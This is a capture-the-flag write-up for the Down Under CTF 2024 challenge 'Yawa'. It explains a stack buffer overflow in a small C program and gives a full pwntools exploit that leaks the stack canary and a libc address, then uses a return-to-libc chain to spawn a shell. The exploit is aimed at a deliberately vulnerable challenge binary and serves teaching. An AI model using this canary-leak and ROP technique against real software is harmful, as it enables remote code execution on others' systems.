---
id: index
title: Yawa writeup
description: Writeup for challenge "Yawa" of Down Under CTF 2024
---

## Prologue

Difficulty: beginner

Category: binary exploitation

Solved: 184

!!! quote "Description"
    Yet another welcome application.

Input files:

??? info "yawa.c"
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    void init() {
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
    }
    
    int menu() {
        int choice;
        puts("1. Tell me your name");
        puts("2. Get a personalised greeting");
        printf("> ");
        scanf("%d", &choice);
        return choice;
    }
    
    int main() {
        init();
    
        char name[88];
        int choice;
    
        while(1) {
            choice = menu();
            if(choice == 1) {
                read(0, name, 0x88);
            } else if(choice == 2) {
                printf("Hello, %s\n", name);
            } else {
                break;
            }
        }
    }
    ```

* [yawa binary](https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/beginner/yawa/src/yawa)
* [libc.so.6](https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/beginner/yawa/src/libc.so.6)
* [ld-linux-x86-64.so.2](https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/beginner/yawa/src/ld-linux-x86-64.so.2)

NB:

* Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by **number**, 0-based index implied. 
 
  Ie, element `0` of list `[1, 2, 4, 8, 16]` is `1`, Element `3` is `8`.
  
  When element is reference in explanation with **word** (first, third...), 1-based system is implied.

  Ie, first character of string `Hello World!` is `H`, fifth is `o`.

* Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure.

* I am using gdb with [pwndbg](https://github.com/pwndbg/pwndbg) plugin

## My struggle

Task includes binary(with libc library and ld linker to run it) and source code. First thing I review source code to build a plan.
There is no `win()` function or equivalent so we likely have to get RCE (shell or similar). Source code is so short that it don't
take long to find a bug in code that we can exploit:

```c
char name[88];                 # desclare variable name
int choice;

while(1) {
    choice = menu();
    if(choice == 1) {
        read(0, name, 0x88);  # read input into variable name
    } else if(choice == 2) {
        printf("Hello, %s\n", name);
    } else {
        break;
    }
}
```

Variable `name` is a buffer of 88 characters, but `read(0, name 0x88)` reads up to 0x88 = 136 characters. Means we can overflow
stack and get code execution.

Now that we know what to do lets check what type of binary we have and what types of protection are enabled:

```bash
$ file yawa  
yawa: ELF 64-bit LSB pie executable,
  x86-64,                                # 64-bit
  version 1 (SYSV),
  dynamically linked,
  interpreter ./ld-linux-x86-64.so.2,
  for GNU/Linux 3.2.0,
  BuildID[sha1]=7f7b72aaab967245353b6816808804a6c4ad2168,
  not stripped
                                                                                                                                                                       
$ checksec --file=yawa        
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   45 Symbols        No    0               2               yawa
```

So, we have full package:

* Canary stack protection - stack is protected from overwrites;
* NX enabled - stack is not executable;
* PIE enabled - every time you run the file it gets loaded into a different memory address.

If you are not familiar with any of above techniques and would like to learn about them (I am going to briefly touch them, but
there is goal to include in-detail explanation of each of the techniques in this writeup) I recommend reading following 
gitbook notes: https://ir0nstone.gitbook.io/notes. This is by a long shot the best resource I have seen on internet on the topic
both quality of explanation and completeness of content is superb.

Next I use [pwninit](https://github.com/io12/pwninit) to be able to run binary on my machine without need to juggle with environment variable paths etc:
```bash
$ pwninit --bin yawa --libc ./libc.so.6
```

Exploit algorithm:

1. Leak canary value from stack to bypass canary protection;
2. Leak libc address to find [system](https://man7.org/linux/man-pages/man3/system.3.html) call;
3. Use buffer overflow to get remote shell and obtain flag.

Here is sample memory layout of stack that we will be working with:

```txt title="Memory layout"
0x7fffffffdc60: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc68: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc70: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc78: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc80: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc88: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc90: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdc98: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdca0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdca8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdcb0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdcb8: 0x00    0x87    0x60    0x15    0x3c    0x9c    0x6f    0x4b
0x7fffffffdcc0: 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffdcc8: 0x90    0x9d    0xc2    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffdcd0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

Variable name is stored at address 0x7fffffffdc60 (line 1).

Canary value is stored at address 0x7fffffffdcb8 (line 12), it always ends with 0x00 on linux (remember - its little endian). Therefore, its 
value is 0x4b6f9c3c15608700.

At address 0x7fffffffdcb8 we see some 8byte long number 1 (not sure what it is - I've left it untouched in my work).

At address 0x7fffffffdcc8 (line 14) we see return address from the main function (0x00007ffff7c29d90), here we want to place jump to system call.


### Leak canary value

Canary protection (read more [here](https://ir0nstone.gitbook.io/notes/types/stack/canaries)) puts a random value on stack
before execution and checks if hasn't been modified while function was running (if it is - program exits).

If we want overwrite return address at 0x7fffffffdcc8, by overflowing variable `name` at 0x7fffffffdc60,
we will have overwrite canary address at 0x7fffffffdcb8 as we can only write continues block of memory. 
Therefore, we will have to leak canary value from stack and when we overflow buffer put exactly same bytes in the same place
to prevent canary protection from triggering.

To leak address we can take advantage of "print your name functionality":

```c
} else if(choice == 2) {
     printf("Hello, %s\n", name);
}
```
`%s` modifier of `printf` prints all bytes starting from address `name` until it reaches nullbyte. So if we put 'a' from
0x7fffffffdc60 till 0x7fffffffdcb8, it is going to print `aaaaa...` and won't stop just on 'a' (as there is no
nullbyte) it will continue printing up until 0x7fffffffdcc0 (including entire canary value) and then stop:

```py title="leak canary block" 
# 'io' is pwntools input/output pipe object that connected to process or remote server

def get_canary_value():
    io.recvuntil(b"> ")                  # wait till target binary initialises
    io.sendline(b"1")                    # send choice 1 - enter value for name
    io.sendline(b"a" * 88)               # enter our name 88 a + '\n' (newline char appended by function sendline - it will overwrite nullbyte of canary)
    io.recvuntil(b"> ")                  # wait till binary asks us to make a choice
    io.sendline(b"2")                    # send choice 2 - print name value
    io.recvline()                        # receive all aaaa... till '\n'
    addr_raw = io.recvline().strip()     # receive canary value in little endian order
    addr_raw = bytearray(1) + addr_raw   # append nullbyte that we skipped
    return unpack(addr_raw[0:8])         # convert to little endian byte array number
```

### Leak libc address

Next step is to find base virtual address of libc, so we can find `system` call. Address on stack of return address from our
main function is address of `__libc_start_call_main` - as you might guess its inside libc library. To read address of the function, we can use same technique as
we used previously to reading canary value. When library is loaded into memory, its loaded as a
single blob, so even though virtual location will be different each time, blob content is always same. Therefore we can calculate
position of elements inside the library relative to each other and it won't change doesn't matter where library is loaded:

```bash
$ readelf -s ./libc.so.6  | grep __libc_start_cal       
     6: 0000000000029d10   172 FUNC    LOCAL  DEFAULT   15 __libc_start_cal[...]
$ readelf -s libc.so.6  | grep system     
  8412: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system
```
This means that `system` function will be always `0x50d70-0x29d10 = 0x27060` bytes apart from `__libc_start_call_main` function.
For our our sample memory dump we saw return address 0x7ffff7c29d90 - we return to the middle of `libc_start_call_main`,
so we can infer that libc library is mapped to address `0x7ffff7c29d90 -0x29d90 = 0x7ffff7c00000` (segments are typically round numbers).
So `system` address is `0x7ffff7c00000+0x50d70 = 0x7ffff7c50d70`.

We can also double check our calculations by checking process memory mapping using gdb or cat:

=== "gdb debugger"

    ```bash hl_lines="11"
    pwndbg> info proc mappings
    process 19607
    Mapped address spaces:
    
              Start Addr           End Addr       Size     Offset  Perms  objfile
          0x555555554000     0x555555555000     0x1000        0x0  r--p   /home/kali/Downloads/yawa_s/yawa_patched
          0x555555555000     0x555555556000     0x1000     0x1000  r-xp   /home/kali/Downloads/yawa_s/yawa_patched
          0x555555556000     0x555555557000     0x1000     0x2000  r--p   /home/kali/Downloads/yawa_s/yawa_patched
          0x555555557000     0x555555558000     0x1000     0x2000  r--p   /home/kali/Downloads/yawa_s/yawa_patched
          0x555555558000     0x55555555b000     0x3000     0x3000  rw-p   /home/kali/Downloads/yawa_s/yawa_patched
          0x7ffff7c00000     0x7ffff7c28000    0x28000        0x0  r--p   /home/kali/Downloads/yawa_s/libc.so.6
          0x7ffff7c28000     0x7ffff7dbd000   0x195000    0x28000  r-xp   /home/kali/Downloads/yawa_s/libc.so.6
          0x7ffff7dbd000     0x7ffff7e15000    0x58000   0x1bd000  r--p   /home/kali/Downloads/yawa_s/libc.so.6
          0x7ffff7e15000     0x7ffff7e16000     0x1000   0x215000  ---p   /home/kali/Downloads/yawa_s/libc.so.6
          0x7ffff7e16000     0x7ffff7e1a000     0x4000   0x215000  r--p   /home/kali/Downloads/yawa_s/libc.so.6
          0x7ffff7e1a000     0x7ffff7e1c000     0x2000   0x219000  rw-p   /home/kali/Downloads/yawa_s/libc.so.6
          0x7ffff7e1c000     0x7ffff7e29000     0xd000        0x0  rw-p   
          0x7ffff7fb8000     0x7ffff7fbd000     0x5000        0x0  rw-p   
          0x7ffff7fbd000     0x7ffff7fc1000     0x4000        0x0  r--p   [vvar]
          0x7ffff7fc1000     0x7ffff7fc3000     0x2000        0x0  r-xp   [vdso]
          0x7ffff7fc3000     0x7ffff7fc5000     0x2000        0x0  r--p   /home/kali/Downloads/yawa_s/ld-2.35.so
          0x7ffff7fc5000     0x7ffff7fef000    0x2a000     0x2000  r-xp   /home/kali/Downloads/yawa_s/ld-2.35.so
          0x7ffff7fef000     0x7ffff7ffa000     0xb000    0x2c000  r--p   /home/kali/Downloads/yawa_s/ld-2.35.so
          0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x37000  r--p   /home/kali/Downloads/yawa_s/ld-2.35.so
          0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x39000  rw-p   /home/kali/Downloads/yawa_s/ld-2.35.so
          0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
    ```

=== "bash"

    ```bash hl_lines="7"
    cat /proc/19607/maps 
    555555554000-555555555000 r--p 00000000 08:01 1212715                    /home/kali/Downloads/yawa_s/yawa_patched
    555555555000-555555556000 r-xp 00001000 08:01 1212715                    /home/kali/Downloads/yawa_s/yawa_patched
    555555556000-555555557000 r--p 00002000 08:01 1212715                    /home/kali/Downloads/yawa_s/yawa_patched
    555555557000-555555558000 r--p 00002000 08:01 1212715                    /home/kali/Downloads/yawa_s/yawa_patched
    555555558000-55555555b000 rw-p 00003000 08:01 1212715                    /home/kali/Downloads/yawa_s/yawa_patched
    7ffff7c00000-7ffff7c28000 r--p 00000000 08:01 1213608                    /home/kali/Downloads/yawa_s/libc.so.6
    7ffff7c28000-7ffff7dbd000 r-xp 00028000 08:01 1213608                    /home/kali/Downloads/yawa_s/libc.so.6
    7ffff7dbd000-7ffff7e15000 r--p 001bd000 08:01 1213608                    /home/kali/Downloads/yawa_s/libc.so.6
    7ffff7e15000-7ffff7e16000 ---p 00215000 08:01 1213608                    /home/kali/Downloads/yawa_s/libc.so.6
    7ffff7e16000-7ffff7e1a000 r--p 00215000 08:01 1213608                    /home/kali/Downloads/yawa_s/libc.so.6
    7ffff7e1a000-7ffff7e1c000 rw-p 00219000 08:01 1213608                    /home/kali/Downloads/yawa_s/libc.so.6
    7ffff7e1c000-7ffff7e29000 rw-p 00000000 00:00 0 
    7ffff7fb8000-7ffff7fbd000 rw-p 00000000 00:00 0 
    7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]
    7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]
    7ffff7fc3000-7ffff7fc5000 r--p 00000000 08:01 1212676                    /home/kali/Downloads/yawa_s/ld-2.35.so
    7ffff7fc5000-7ffff7fef000 r-xp 00002000 08:01 1212676                    /home/kali/Downloads/yawa_s/ld-2.35.so
    7ffff7fef000-7ffff7ffa000 r--p 0002c000 08:01 1212676                    /home/kali/Downloads/yawa_s/ld-2.35.so
    7ffff7ffb000-7ffff7ffd000 r--p 00037000 08:01 1212676                    /home/kali/Downloads/yawa_s/ld-2.35.so
    7ffff7ffd000-7ffff7fff000 rw-p 00039000 08:01 1212676                    /home/kali/Downloads/yawa_s/ld-2.35.so
    7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
    ```

Code snippet to get libc base address:

```py title="leak libc base address"
def get_libc_base_address():
    io.recvuntil(b"> ")                  # wait till target binary is ready to read choice
    io.sendline(b"1")                    # send choice 1 - enter value for name
    io.sendline(b"a" * 103)              # enter name 103 a + '\n' that is appended automatically
    io.recvuntil(b"> ")                  # wait till binary asks us to make a choice
    io.sendline(b"2")                    # send choice 2 - print name value
    io.recvline()                        # receive all aaaa... till '\n'
    # receive libc_main address in little endian and pad with 0
    addr_libc_main = io.recvline().strip()
    addr_libc_main = addr_libc_main + bytearray(8 - len(addr_libc_main))
    # convert from little to big endian and subtract return offset to get base address of libc
    return unpack(addr_libc_main[0:8]) - 0x29d90
```

### Remote shell

With canary value and libc address in hands we are ready to get remote shell. Given there is NX protection and stack code
is not executable we will use ROP (more on [ironstone](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming)) to execute return to libc technique.
First we need to get address of string "/bin/sh" in libc library (`system` function takes argument what to launch):

```bash
# strings -a -t x libc.so.6 | grep /bin/sh
sh_offset = 0x1d8678
```

Using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) we find tons of useful gadgets in libc library:
```bash
$ ROPgadget --binary libc.so.6 | grep ret
```
I've selected few that will help me to build return to libc chain:

* 0x000000000002a3e5: pop rdi
* 0x00000000000baaf9: xor rax, rax, ret

With all of this our payload will look like:

1. 88 bytes of padding for buffer
2. 8 bytes of canary value
3. 8 bytes value of 1 - unchanged
4. 8 bytes pop rdi gadget
5. 8 bytes address of "/bin/sh" string (this is argument for pop rdi gadget). As a result we set register RDI to /bin/sh
6. 8 bytes xor rax, rax, ret - this is NOP operation for [stack alignment](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment)
7. 8 bytes address for `system` call

Full python script:

??? success "solve.py"
    ```py
    from pwn import *
    
    context.binary = elfexe = ELF(os.path.dirname(__file__) + '/yawa_patched')
    libc = elfexe.libc
    
    context.log_level = 'warn'
    
    arguments = []
    if args['REMOTE']:
        remote_server = '2024.ductf.dev'
        remote_port = 30010
        io = remote(remote_server, remote_port)
    else:
        io = process([elfexe.path] + arguments)
    
    def get_canary_value():
        io.recvuntil(b"> ")                  # wait till target binary initialises
        io.sendline(b"1")                    # send choice 1 - enter value for name
        io.sendline(b"a" * 88)               # enter our name 88 a + '\n' (newline char appended by function sendline - it will overwrite nullbyte of canary)
        io.recvuntil(b"> ")                  # wait till binary asks us to make a choice
        io.sendline(b"2")                    # send choice 2 - print name value
        io.recvline()                        # receive all aaaa... till '\n'
        addr_raw = io.recvline().strip()     # receive canary value in little endian order
        addr_raw = bytearray(1) + addr_raw   # append nullbyte that we skipped
        return unpack(addr_raw[0:8])         # convert to little endian byte array number
    
    def get_libc_base_address():
        io.recvuntil(b"> ")                  # wait till target binary is ready to read choice
        io.sendline(b"1")                    # send choice 1 - enter value for name
        io.sendline(b"a" * 103)              # enter name 103 a + '\n' that is appended automatically
        io.recvuntil(b"> ")                  # wait till binary asks us to make a choice
        io.sendline(b"2")                    # send choice 2 - print name value
        io.recvline()                        # receive all aaaa... till '\n'
        # receive libc_main address in little endian and convert it to number
        addr_libc_main = io.recvline().strip()
        addr_libc_main = addr_libc_main + bytearray(8 - len(addr_libc_main))
        return unpack(addr_libc_main[0:8]) - 0x29d90
    
    
    canary = get_canary_value()
    # set base address of libc library so we can use pwntools to convert offsets to virtual addresses
    libc.address = get_libc_base_address() 
    
    # strings -a -t x libc.so.6 | grep /bin/sh
    sh_offset = libc.offset_to_vaddr(0x1d8678)
    # readelf -s libc.so.6 | grep system
    system = libc.offset_to_vaddr(0x050d70)
    
    # pop rdi
    gadgetPopRdi = libc.offset_to_vaddr(0x000000000002a3e5)
    # xor rax, rax, ret
    gadgetNop = libc.offset_to_vaddr(0x00000000000baaf9)
    
    payload = flat(
        b"a" * 88,
        pack(canary),
        pack(1),
        pack(gadgetPopRdi),
        pack(sh_offset),
        pack(gadgetNop),
        pack(system)
    )
    
    # send payload as name
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.sendline(payload)
    # exit main which will execute return-to-libc
    io.recvuntil(b"> ")
    io.sendline(b"3")
    
    io.interactive()
    io.close()
    ```

## Epilogue

* Official website: [https://downunderctf.com/](https://downunderctf.com/)
* Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public

*[RCE]: Remote Code Execution
*[PIE]: Postiion Independent Executable
*[ROP]: Return-Oriented Programming
